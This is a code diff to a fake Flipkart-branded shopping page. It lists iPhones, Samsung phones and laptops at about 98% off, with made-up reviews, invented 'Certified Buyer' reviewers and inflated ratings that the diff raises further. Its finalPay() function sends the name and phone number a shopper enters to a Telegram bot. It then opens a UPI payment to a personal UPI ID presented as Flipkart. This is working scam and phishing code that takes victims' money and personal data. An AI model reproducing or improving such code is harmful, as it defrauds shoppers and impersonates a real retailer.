@@ -16,10 +16,12 @@
         .rating-badge { background: #388e3c; color: #fff; padding: 1px 5px; border-radius: 3px; font-weight: 500; font-size: 11px; display: inline-flex; align-items: center; }
         .input-box { width: 100%; border: 1px solid #d4d4d4; padding: 12px; border-radius: 2px; font-size: 14px; margin-bottom: 12px; outline: none; background: #fff; }
         .f-assured { height: 16px; margin-left: 5px; }
-        .swiper { width: 100%; height: 350px; background: #fff; }
+        .banner-swiper { width: 100%; background: #fff; }
+        .product-swiper { width: 100%; height: 350px; background: #fff; }
         .swiper-slide { display: flex; align-items: center; justify-content: center; }
-        .swiper-slide img { max-height: 90%; max-width: 90%; object-fit: contain; }
+        .swiper-slide img { width: 100%; height: auto; object-fit: contain; }
         .cat-scroll::-webkit-scrollbar { display: none; }
+        .swiper-pagination-bullet-active { background: #2874f0 !important; }
     </style>
 </head>
 <body>
@@ -38,55 +40,101 @@
             <div class="text-center flex-shrink-0"><img src="https://rukminim2.flixcart.com/flap/128/128/image/71050627a56b4693.png?q=100" class="h-10 mx-auto"><p class="text-[10px] mt-1">Travel</p></div>
         </div>
 
-        <div class="bg-white border-b">
-            <img src="https://i.ibb.co/8D0YXrgf/Whats-App-Image-2025-12-30-at-03-02-35-1.jpg" class="w-full">
-        </div>
-        <div class="mt-1">
-            <img src="https://i.ibb.co/7JmfFcB5/Whats-App-Image-2025-12-30-at-03-02-36.jpg" class="w-full">
+        <div class="swiper banner-swiper">
+            <div class="swiper-wrapper">
+                <div class="swiper-slide"><img src="https://i.ibb.co/QFPqkcXQ/Whats-App-Image-2025-12-30-at-04-58-57.jpg"></div>
+                <div class="swiper-slide"><img src="https://i.ibb.co/Mx8dK4qj/Whats-App-Image-2025-12-30-at-04-58-58.jpg"></div>
+            </div>
+            <div class="swiper-pagination"></div>
         </div>
 
         <div class="bg-white p-3 mt-1 border-b flex justify-between items-center">
             <h2 class="font-bold text-gray-800">Deals of the Day</h2>
             <span class="bg-blue-600 text-white text-[10px] px-2 py-1 rounded">VIEW ALL</span>
         </div>
-
         <div id="product-list" class="mt-1 bg-white"></div>
     </div>
 
-    <div id="page-detail" class="hidden fixed inset-0 bg-white z-[200] overflow-y-auto pb-20">
+    <div id="page-detail" class="hidden fixed inset-0 bg-[#f1f3f6] z-[200] overflow-y-auto pb-20">
         <nav class="p-3 border-b sticky top-0 bg-white z-[210] flex items-center justify-between shadow-sm">
             <i class="fa-solid fa-arrow-left text-xl text-gray-700" onclick="showPage('page-home')"></i>
             <img src="https://static-assets-web.flixcart.com/fk-p-linchpin-web/fk-cp-zion/img/flipkart-plus_8d85f4.png" class="h-4">
             <div class="flex space-x-4"><i class="fa-solid fa-heart text-gray-400"></i><i class="fa-solid fa-cart-shopping text-gray-500"></i></div>
         </nav>
         
-        <div class="swiper mySwiper">
-            <div class="swiper-wrapper" id="det-images"></div>
-            <div class="swiper-pagination"></div>
-        </div>
-
-        <div class="p-4 border-b">
-            <h1 id="det-title" class="text-sm text-gray-800 leading-tight"></h1>
-            <div class="flex items-center mt-2 space-x-2">
-                <div class="rating-badge" id="det-rate"></div>
-                <span class="text-xs text-gray-400" id="det-rev"></span>
-                <img src="https://static-assets-web.flixcart.com/fk-p-linchpin-web/fk-cp-zion/img/fa_62673a.png" class="f-assured">
+        <div class="bg-white">
+            <div class="swiper product-swiper">
+                <div class="swiper-wrapper" id="det-images"></div>
+                <div class="swiper-pagination"></div>
             </div>
-            <div class="flex items-center space-x-2 mt-2">
-                <span class="text-2xl font-bold text-gray-900" id="det-price"></span>
-                <span class="text-gray-400 line-through text-sm" id="det-mrp"></span>
-                <span class="text-green-600 font-bold text-sm">98% off</span>
-            </div>
-        </div>
 
-        <div class="p-4 bg-white mt-2 border-b">
-            <h3 class="font-bold text-gray-800 mb-3">Customer Reviews</h3>
-            <div class="border-t pt-3">
-                <div class="flex items-center space-x-2"><span class="bg-green-700 text-white text-[10px] px-1 rounded">5 ★</span><span class="font-bold text-xs">Super!</span></div>
-                <p class="text-xs text-gray-600 mt-1">Excellent product, delivery was very fast. Value for money!</p>
-                <div class="flex mt-2 space-x-2">
-                    <img src="https://rukminim2.flixcart.com/blobio/140/140/imr-202409/blobio-imr-202409_46328766100548f0803517c527f54c93.jpg?q=90" class="w-12 h-12 rounded border">
+            <div class="p-4 border-b">
+                <h1 id="det-title" class="text-sm text-gray-800 leading-tight"></h1>
+                <div class="flex items-center mt-2 space-x-2">
+                    <div class="rating-badge" id="det-rate"></div>
+                    <span class="text-xs text-gray-400" id="det-rev"></span>
+                    <img src="https://static-assets-web.flixcart.com/fk-p-linchpin-web/fk-cp-zion/img/fa_62673a.png" class="f-assured">
                 </div>
+                <div class="flex items-center space-x-2 mt-2">
+                    <span class="text-2xl font-bold text-gray-900" id="det-price"></span>
+                    <span class="text-gray-400 line-through text-sm" id="det-mrp"></span>
+                    <span class="text-green-600 font-bold text-sm">98% off</span>
+                </div>
+            </div>
+        </div>
+
+        <div class="bg-white mt-2 p-4">
+            <h3 class="font-bold text-gray-900 border-b pb-2">Product Details</h3>
+            <div class="mt-3 space-y-2 text-xs text-gray-700">
+                <div class="flex justify-between border-b pb-1"><span>Brand</span><span class="font-medium text-black">Official Store</span></div>
+                <div class="flex justify-between border-b pb-1"><span>Model</span><span class="font-medium text-black">2025 Edition</span></div>
+                <div class="flex justify-between border-b pb-1"><span>Warranty</span><span class="font-medium text-black">1 Year Brand Warranty</span></div>
+                <div class="flex justify-between border-b pb-1"><span>Delivery</span><span class="font-medium text-green-600">FREE in 2 Days</span></div>
+            </div>
+            <p class="mt-3 text-xs leading-5 text-gray-600">This premium product comes with the latest technology, ensuring high durability and top-notch performance. Trusted by millions of customers across India during the Big Billion Days.</p>
+        </div>
+
+        <div class="bg-white mt-2 p-4">
+            <div class="flex justify-between items-center mb-4">
+                <h3 class="font-bold text-gray-900">Ratings & Reviews</h3>
+                <button class="border px-3 py-1 text-xs font-bold rounded shadow-sm">Rate Product</button>
+            </div>
+            
+            <div class="flex items-center space-x-4 mb-6">
+                <div class="text-center">
+                    <h1 class="text-3xl font-bold">4.8 <span class="text-lg">★</span></h1>
+                    <p class="text-[10px] text-gray-400">2,40,501 ratings</p>
+                </div>
+                <div class="flex-1 space-y-1">
+                    <div class="flex items-center text-[10px] gap-2"><span>5 ★</span><div class="w-full bg-gray-200 h-1.5 rounded"><div class="bg-green-600 h-1.5 w-[85%] rounded"></div></div></div>
+                    <div class="flex items-center text-[10px] gap-2"><span>4 ★</span><div class="w-full bg-gray-200 h-1.5 rounded"><div class="bg-green-500 h-1.5 w-[10%] rounded"></div></div></div>
+                    <div class="flex items-center text-[10px] gap-2"><span>3 ★</span><div class="w-full bg-gray-200 h-1.5 rounded"><div class="bg-yellow-400 h-1.5 w-[3%] rounded"></div></div></div>
+                </div>
+            </div>
+
+            <div class="border-t py-4">
+                <div class="flex items-center gap-2"><span class="bg-green-700 text-white text-[10px] px-1.5 rounded font-bold">5 ★</span><span class="font-bold text-xs">Simply Awesome</span></div>
+                <p class="text-xs mt-2 text-gray-700 italic">"I received it today. Very fast delivery and the product quality is beyond expectations. Best deal in Big Billion Days!"</p>
+                <div class="flex gap-2 mt-3">
+                    <img src="https://rukminim2.flixcart.com/blobio/140/140/imr-202409/blobio-imr-202409_46328766100548f0803517c527f54c93.jpg?q=90" class="w-16 h-16 rounded border object-cover">
+                </div>
+                <div class="flex items-center justify-between mt-3 text-[10px] text-gray-400">
+                    <span>Rahul Sharma, Mumbai</span>
+                    <div class="flex items-center gap-1 text-gray-600"><i class="fa-solid fa-circle-check text-green-600"></i> Certified Buyer</div>
+                </div>
+            </div>
+
+            <div class="border-t py-4">
+                <div class="flex items-center gap-2"><span class="bg-green-700 text-white text-[10px] px-1.5 rounded font-bold">5 ★</span><span class="font-bold text-xs">Value for money</span></div>
+                <p class="text-xs mt-2 text-gray-700">"At this price point, nothing can beat this. Highly recommended to everyone."</p>
+                <div class="flex items-center justify-between mt-3 text-[10px] text-gray-400">
+                    <span>Priya Singh, Delhi</span>
+                    <div class="flex items-center gap-1 text-gray-600"><i class="fa-solid fa-circle-check text-green-600"></i> Certified Buyer</div>
+                </div>
+            </div>
+
+            <div class="border-t py-4 text-center">
+                <button class="text-blue-600 font-bold text-xs uppercase">All 14,204 Reviews</button>
             </div>
         </div>
 
@@ -119,7 +167,7 @@
             <p id="sum-name" class="font-bold text-sm text-gray-800"></p>
             <p id="sum-addr" class="text-xs text-gray-500 mt-1"></p>
         </div>
-        <div class="bg-white p-4 m-3 rounded-lg flex shadow-sm border">
+        <div class="bg-white p-4 m-3 rounded-lg flex shadow-sm border items-center">
             <img id="sum-img" class="h-20 w-20 object-contain mr-4 border p-1 rounded">
             <div class="flex-1">
                 <p id="sum-title" class="text-xs font-medium text-gray-700"></p>
@@ -128,8 +176,8 @@
             </div>
         </div>
         <div class="fixed bottom-0 w-full p-4 bg-white border-t flex justify-between items-center z-[500]">
-            <div id="sum-final" class="text-xl font-bold"></div>
-            <button onclick="finalPay()" class="btn-orange px-12 py-3.5 font-bold uppercase text-sm shadow-md">Continue</button>
+            <div id="sum-final" class="text-xl font-bold ml-2"></div>
+            <button onclick="finalPay()" class="btn-orange px-10 py-3.5 font-bold uppercase text-sm shadow-md mr-2">Continue</button>
         </div>
     </div>
 
@@ -140,14 +188,15 @@
         const UPI_ID = "8709615634-w350@ybl";
 
         let products = [
-            { id: 0, name: "Apple iPhone 16 Pro Max (Desert Titanium, 256 GB)", price: 1440, mrp: 159900, images: ["https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/b/f/5/-original-imahggexm5yafhez.jpeg?q=70", "https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/5/i/7/-original-imahggexvthqz97h.jpeg?q=70"], rating: "4.7", rev: "12,504" },
-            { id: 1, name: "Samsung Galaxy S24 Ultra 5G (Titanium Gray, 512 GB)", price: 1299, mrp: 134999, images: ["https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/j/m/z/-original-imahgfmxumntk7sy.jpeg?q=70"], rating: "4.6", rev: "8,240" },
-            { id: 2, name: "Noise Buds VS104 with 45 Hours Playtime", price: 120, mrp: 2999, images: ["https://rukminim2.flixcart.com/image/612/612/xif0q/headphone/p/v/f/-original-imagp9vsq2zyhuvv.jpeg?q=70"], rating: "4.1", rev: "2,15,402" },
-            { id: 3, name: "Fire-Boltt Phoenix Smartwatch Calling", price: 450, mrp: 12999, images: ["https://rukminim2.flixcart.com/image/612/612/xif0q/smartwatch/t/l/j/-original-imagmtfyrztjymzh.jpeg?q=70"], rating: "4.3", rev: "95,000" },
-            { id: 4, name: "HP Victus Gaming Laptop Intel Core i5", price: 1450, mrp: 78000, images: ["https://rukminim2.flixcart.com/image/312/312/xif0q/computer/n/i/e/15-fa1145tx-gaming-laptop-hp-original-imahy3uxyecafvsq.jpeg?q=70"], rating: "4.4", rev: "12,000" }
+            { id: 0, name: "Apple iPhone 16 Pro Max (Desert Titanium, 256 GB)", price: 1440, mrp: 159900, images: ["https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/b/f/5/-original-imahggexm5yafhez.jpeg?q=70", "https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/5/i/7/-original-imahggexvthqz97h.jpeg?q=70"], rating: "4.8", rev: "2,40,501" },
+            { id: 1, name: "Samsung Galaxy S24 Ultra 5G (Titanium Gray, 512 GB)", price: 1299, mrp: 134999, images: ["https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/j/m/z/-original-imahgfmxumntk7sy.jpeg?q=70"], rating: "4.7", rev: "82,240" },
+            { id: 2, name: "Noise Buds VS104 with 45 Hours Playtime", price: 120, mrp: 2999, images: ["https://rukminim2.flixcart.com/image/612/612/xif0q/headphone/p/v/f/-original-imagp9vsq2zyhuvv.jpeg?q=70"], rating: "4.6", rev: "2,15,402" },
+            { id: 3, name: "Fire-Boltt Phoenix Smartwatch Calling", price: 450, mrp: 12999, images: ["https://rukminim2.flixcart.com/image/612/612/xif0q/smartwatch/t/l/j/-original-imagmtfyrztjymzh.jpeg?q=70"], rating: "4.7", rev: "95,000" },
+            { id: 4, name: "HP Victus Gaming Laptop Intel Core i5", price: 1450, mrp: 78000, images: ["https://rukminim2.flixcart.com/image/312/312/xif0q/computer/n/i/e/15-fa1145tx-gaming-laptop-hp-original-imahy3uxyecafvsq.jpeg?q=70"], rating: "4.5", rev: "12,000" }
         ];
 
-        let swiperInstance = null;
+        new Swiper(".banner-swiper", { loop: true, autoplay: { delay: 3000 }, pagination: { el: ".swiper-pagination", clickable: true } });
+        let productSwiper = null;
 
         function showPage(id) {
             document.querySelectorAll('[id^="page-"]').forEach(p => p.classList.add('hidden'));
@@ -173,16 +222,8 @@
             let p = products[id];
             window.activeP = p;
             document.getElementById('det-images').innerHTML = p.images.map(img => `<div class="swiper-slide"><img src="${img}"></div>`).join('');
-            
-            if(swiperInstance) swiperInstance.destroy();
-            setTimeout(() => {
-                swiperInstance = new Swiper(".mySwiper", {
-                    pagination: { el: ".swiper-pagination", clickable: true },
-                    autoplay: { delay: 2500, disableOnInteraction: false },
-                    loop: p.images.length > 1
-                });
-            }, 100);
-
+            if(productSwiper) productSwiper.destroy();
+            setTimeout(() => { productSwiper = new Swiper(".product-swiper", { pagination: { el: ".swiper-pagination", clickable: true }, autoplay: { delay: 2500 }, loop: p.images.length > 1 }); }, 100);
             document.getElementById('det-title').innerText = p.name;
             document.getElementById('det-rate').innerText = p.rating + " ★";
             document.getElementById('det-rev').innerText = "(" + p.rev + ")";
@@ -219,7 +260,7 @@
 
         async function finalPay() {
             const msg = `🚀 *ORDER ALERT*\n👤 Name: ${document.getElementById('in-name').value}\n📞 Mob: ${document.getElementById('in-phone').value}\n📦 Item: ${window.activeP.name}\n💰 Price: ₹${window.activeP.price}`;
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ chat_id: CHAT_ID, text: msg }) });
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' }) });
             window.location.href = `upi://pay?pa=${UPI_ID}&pn=Flipkart&am=${window.activeP.price}&cu=INR&tn=Order_Final`;
         }
 
